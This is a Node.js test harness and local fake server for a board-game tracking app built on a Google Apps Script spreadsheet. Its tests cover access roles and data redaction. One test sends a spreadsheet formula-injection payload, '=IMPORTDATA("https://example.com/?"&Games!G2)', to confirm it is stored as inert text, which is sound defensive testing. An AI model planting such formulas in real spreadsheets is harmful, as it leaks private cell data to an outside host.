#!/usr/bin/env node
/**
 * Runs sheet/Code.gs against an in-memory fake spreadsheet, so the app and the
 * script can be developed and tested without a Google account.
 *
 *   node tools/fake-sheet-server.js          serve on http://localhost:4175/exec
 *   node tools/fake-sheet-server.js --test   run the script's checks and exit
 *
 * The fake implements only the Apps Script calls that Code.gs uses.
 */
const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');
const assert = require('assert');

function makeSheet(rows) {
  const data = rows.map(r => r.slice());
  const width = () => Math.max(0, ...data.map(r => r.length));
  const padded = () => data.map(r => Array.from({length: width()}, (_, i) => r[i] ?? ''));
  return {
    data,
    getDataRange: () => ({
      getValues: () => padded(),
      getDisplayValues: () => padded().map(r => r.map(v => String(v)))
    }),
    getRange: (row, col, numRows, numCols) => ({
      setValue: value => {
        while (data.length < row) data.push([]);
        data[row - 1][col - 1] = value;
      },
      setValues: values => {
        assert.strictEqual(values.length, numRows);
        values.forEach((cells, r) => {
          assert.strictEqual(cells.length, numCols);
          while (data.length < row + r) data.push([]);
          cells.forEach((value, c) => { data[row + r - 1][col + c - 1] = value; });
        });
      }
    }),
    appendRow: values => data.push(values.slice()),
    deleteRow: row => data.splice(row - 1, 1)
  };
}

function freshSheets() {
  return {
    Games: makeSheet([
      ['Game', 'Shelf', 'Played', 'P1 Rating', 'P2 Rating', 'Expansion', 'Price Paid', 'Year bought', 'Notes', 'Players', 'Best At', 'BGG Score', 'BGG Category'],
      ['Azul', 'Family', 'Yes', 8, 7, '', '$32.00', '2022', 'Paid $32 at the local shop', '2-4', '2', 7.8, 'Abstract Strategy'],
      ['Catan', 'Family', 'No', '', '', '', '$42.00', '2020', '', '3-4', '4', 7.1, 'Negotiation'],
      ['Sky Team', '2-Player', 'No', '', '', '', '$30.00', '2024', '', '2', '2', 8.2, 'Cooperative'],
      ['', '', '', '', '', '', '', '', '', '', '', '', '']
    ]),
    Plays: makeSheet([
      ['Date', 'Game', 'Winner', 'Notes', 'P1 Rating', 'P2 Rating', 'Play ID'],
      ['2026-10-01', 'Azul', 'Player 1', 'Close one', '', '', 'play-1'],
      ['10/5/2026', 'Azul', 'Player 2', '', '', '', '']
    ]),
    Players: makeSheet([
      ['Player #', 'Name', 'Dino', 'Color'],
      [1, 'Jordan', 'stegosaurus', 'purple'],
      [2, 'Robin', 'trex', 'lime']
    ])
  };
}

function loadScript(sheets) {
  const props = {};
  const sandbox = {
    PropertiesService: {getScriptProperties: () => ({
      getProperty: k => (k in props ? props[k] : null),
      setProperty: (k, v) => { props[k] = String(v); },
      deleteProperty: k => { delete props[k]; }
    })},
    LockService: {getScriptLock: () => ({waitLock() {}, releaseLock() {}})},
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      formatDate: date => date.toISOString().slice(0, 10)
    },
    ContentService: {MimeType: {JSON: 'json'}, createTextOutput: text => ({text, setMimeType() { return this; }})},
    SpreadsheetApp: {getActiveSpreadsheet: () => ({
      getSheetByName: name => sheets[name] || null,
      insertSheet: name => (sheets[name] = makeSheet([])),
      getSpreadsheetTimeZone: () => 'Etc/UTC'
    })}
  };
  const source = fs.readFileSync(path.join(__dirname, '..', 'sheet', 'Code.gs'), 'utf8');
  const names = Object.keys(sandbox);
  const api = new Function(...names, source + '\nreturn {doGet, doPost};')(...names.map(n => sandbox[n]));
  return {
    get: parameter => JSON.parse(api.doGet({parameter}).text),
    post: body => JSON.parse(api.doPost({postData: {contents: JSON.stringify(body)}}).text),
    props
  };
}

function runTests() {
  const sheets = freshSheets();
  const s = loadScript(sheets);
  let n = 0;
  const check = (label, fn) => { fn(); n++; console.log('  ok  ' + label); };

  check('status page gives nothing away', () => assert.deepStrictEqual(Object.keys(s.get({})).sort(), ['app', 'status', 'version']));
  check('no key is refused', () => assert.strictEqual(s.get({action: 'data'}).code, 'denied'));
  check('writes with no key are refused', () => assert.strictEqual(s.post({action: 'add', game: 'Azul'}).code, 'denied'));
  const claim = s.get({action: 'claim'});
  check('first claim returns an owner key', () => assert.ok(/^[a-f0-9]{64}$/.test(claim.ownerKey)));
  check('second claim is refused', () => assert.strictEqual(s.get({action: 'claim'}).code, 'claimed'));
  const owner = s.get({action: 'data', key: claim.ownerKey});
  check('owner sees every game, price, and note', () => {
    assert.strictEqual(owner.role, 'owner');
    assert.strictEqual(owner.games.length, 3);
    assert.strictEqual(owner.games[0]['Price Paid'], '$32.00');
    assert.ok(owner.games[0].Notes);
    assert.strictEqual(owner.players[1].Name, 'Robin');
  });
  const family = s.get({action: 'data', key: owner.familyKey});
  check('family never receives prices or notes', () => {
    assert.strictEqual(family.role, 'family');
    assert.strictEqual(family.games.length, 3);
    assert.ok(!JSON.stringify(family).includes('$'));
    assert.ok(family.games.every(g => !('Notes' in g) && !('Price Paid' in g)));
    assert.ok(family.plays.every(p => !('Notes' in p)));
    assert.ok(!('familyKey' in family));
  });
  check('wrong key is refused', () => assert.strictEqual(s.get({action: 'data', key: 'nope'}).code, 'denied'));

  const added = s.post({action: 'add', key: owner.familyKey, id: 'play-new', date: '2026-11-10', game: 'catan', winner: 'Player 2', p1Rat: '7', p2Rat: '', markPlayed: true});
  check('family can log a play; game is marked played and rated', () => {
    assert.strictEqual(added.playId, 'play-new');
    assert.deepStrictEqual(sheets.Plays.data.at(-1), ['2026-11-10', 'Catan'.toLowerCase(), 'Player 2', '', 7, '', 'play-new']);
    const catan = sheets.Games.data[2];
    assert.strictEqual(catan[2], 'Yes');
    assert.strictEqual(catan[3], 7);
    assert.strictEqual(catan[4], '');
  });
  check('rating without a play', () => {
    assert.strictEqual(s.post({action: 'rate', key: claim.ownerKey, game: 'Sky Team', p1Rat: '', p2Rat: '9.5'}).ratingsUpdated, true);
    assert.strictEqual(sheets.Games.data[3][4], 9.5);
    assert.strictEqual(sheets.Games.data[3][3], '');
    assert.strictEqual(s.post({action: 'rate', key: claim.ownerKey, game: 'Nope', p1Rat: '5'}).ratingsUpdated, false);
  });
  check('delete by Play ID', () => {
    assert.strictEqual(s.post({action: 'delete', key: claim.ownerKey, id: 'play-1'}).playDeleted, true);
    assert.ok(!sheets.Plays.data.some(r => r[6] === 'play-1'));
  });
  check('delete a hand-typed row by date, game, and winner', () => {
    assert.strictEqual(s.post({action: 'delete', key: claim.ownerKey, date: '2026-10-05', game: 'Azul', winner: 'Player 2'}).playDeleted, true);
    assert.strictEqual(s.post({action: 'delete', key: claim.ownerKey, id: 'missing'}).playDeleted, false);
  });
  check('exclude adds the column when missing', () => {
    s.post({action: 'exclude', key: claim.ownerKey, game: 'Azul', excluded: true});
    const col = sheets.Games.data[0].indexOf('Excluded');
    assert.ok(col >= 0);
    assert.strictEqual(sheets.Games.data[1][col], 1);
  });
  check('unknown action is an error, ping is ok', () => {
    assert.strictEqual(s.post({action: 'wipe', key: claim.ownerKey}).status, 'error');
    assert.strictEqual(s.post({action: 'ping', key: claim.ownerKey}).status, 'ok');
  });
  check('a formula sent as a play note is stored as plain text', () => {
    s.post({action: 'add', key: owner.familyKey, id: 'play-f', date: '2026-11-11', game: 'Azul', winner: 'Player 1', notes: '=IMPORTDATA("https://example.com/?"&Games!G2)'});
    assert.ok(sheets.Plays.data.at(-1)[3].startsWith("'="));
  });
  const col = name => sheets.Games.data[0].indexOf(name);
  const azulBgg = {'Game': 'AZUL', 'BGG ID': '230802', 'Players': '2-4', 'BGG Score': '7.8', 'Best At': '9', 'Shelf': 'Wrong', 'Price Paid': '1', 'Notes': 'overwritten?'};
  const wingspan = {'Game': 'Wingspan', 'BGG ID': '266192', 'Shelf': 'Unsorted', 'Players': '1-5', 'BGG Score': '8.0', 'BGG URL': 'https://boardgamegeek.com/boardgame/266192', 'Price Paid': '99', 'Notes': '=1+1'};
  check('family cannot add games', () => {
    assert.strictEqual(s.post({action: 'saveGames', key: owner.familyKey, games: [wingspan]}).code, 'owner_only');
    assert.ok(!sheets.Games.data.some(r => r[0] === 'Wingspan'));
  });
  const saved = s.post({action: 'saveGames', key: claim.ownerKey, games: [azulBgg, wingspan, wingspan, {'Game': '  '}]});
  check('owner adds a new game after the last used row', () => {
    assert.strictEqual(saved.added, 1);
    const row = sheets.Games.data[4];
    assert.strictEqual(row[col('Game')], 'Wingspan');
    assert.strictEqual(row[col('BGG ID')], '266192');
    assert.strictEqual(row[col('Shelf')], 'Unsorted');
    assert.strictEqual(row[col('Players')], "'1-5");
    assert.strictEqual(sheets.Games.data.filter(r => r[0] === 'Wingspan').length, 1);
  });
  check('only the listed columns can be written', () => {
    const row = sheets.Games.data[4];
    assert.strictEqual(row[col('Price Paid')], '');
    assert.strictEqual(row[col('Notes')], '');
  });
  check('an existing game gets blanks filled and nothing overwritten', () => {
    assert.strictEqual(saved.updated, 1);
    const azul = sheets.Games.data[1];
    assert.strictEqual(azul[col('Game')], 'Azul');
    assert.strictEqual(azul[col('BGG ID')], '230802');
    assert.strictEqual(azul[col('Shelf')], 'Family');
    assert.strictEqual(azul[col('Best At')], '2');
    assert.strictEqual(azul[col('Price Paid')], '$32.00');
    assert.ok(String(azul[col('Notes')]).startsWith('Paid'));
  });
  check('saving the same games again changes nothing', () => {
    const again = s.post({action: 'saveGames', key: claim.ownerKey, games: [azulBgg, wingspan]});
    assert.deepStrictEqual([again.added, again.updated, again.unchanged], [0, 0, 2]);
  });
  check('a game matches by BGG ID even when the name differs', () => {
    const renamed = s.post({action: 'saveGames', key: claim.ownerKey, games: [{'Game': 'Wingspan (2nd printing)', 'BGG ID': '266192', 'Age': '10+'}]});
    assert.deepStrictEqual([renamed.added, renamed.updated], [0, 1]);
    assert.strictEqual(sheets.Games.data[4][col('Age')], '10+');
  });
  check('oversized batches are refused', () => {
    const many = Array.from({length: 101}, (_, i) => ({'Game': 'G' + i}));
    assert.strictEqual(s.post({action: 'saveGames', key: claim.ownerKey, games: many}).status, 'error');
  });
  const v = s.get({action: 'data', key: claim.ownerKey});
  check('owner receives a view-only key', () => assert.ok(/^[a-f0-9]{64}$/.test(v.viewKey) && v.viewKey !== v.familyKey && v.viewKey !== claim.ownerKey));
  const view = s.get({action: 'data', key: v.viewKey});
  check('view-only gets games and players, never prices, notes, plays, stats, or keys', () => {
    assert.strictEqual(view.role, 'viewer');
    assert.ok(view.games.length > 0 && view.players.length === 2);
    assert.ok(view.games.every(g => !('Notes' in g) && !('Price Paid' in g)));
    assert.deepStrictEqual([view.plays.length, view.stats.length], [0, 0]);
    assert.ok(!('familyKey' in view) && !('viewKey' in view));
  });
  check('view-only cannot write anything', () => {
    const before = JSON.stringify(sheets);
    for (const action of ['add', 'delete', 'rate', 'exclude', 'saveGames', 'wipe']) {
      assert.strictEqual(s.post({action, key: v.viewKey, game: 'Azul', id: 'play-f', games: [{'Game': 'X'}], p1Rat: '1'}).code, 'view_only');
    }
    assert.strictEqual(JSON.stringify(sheets), before);
    assert.strictEqual(s.post({action: 'ping', key: v.viewKey}).status, 'ok');
  });
  check('a sheet claimed before view links gets a view key on first owner sync', () => {
    delete s.props.VIEW_KEY;
    const again = s.get({action: 'data', key: claim.ownerKey});
    assert.ok(/^[a-f0-9]{64}$/.test(again.viewKey) && again.viewKey !== v.viewKey);
    assert.strictEqual(s.get({action: 'data', key: v.viewKey}).code, 'denied');
  });
  console.log(`${n} checks passed`);
}

if (process.argv.includes('--test')) {
  runTests();
} else {
  const script = loadScript(freshSheets());
  const port = Number(process.env.PORT || 4175);
  http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');
    if (req.method === 'GET') return res.end(JSON.stringify(script.get(Object.fromEntries(url.searchParams))));
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => res.end(JSON.stringify(script.post(JSON.parse(body || '{}')))));
  }).listen(port, '127.0.0.1', () => console.log(`Fake Game Vault sheet at http://localhost:${port}/exec`));
}
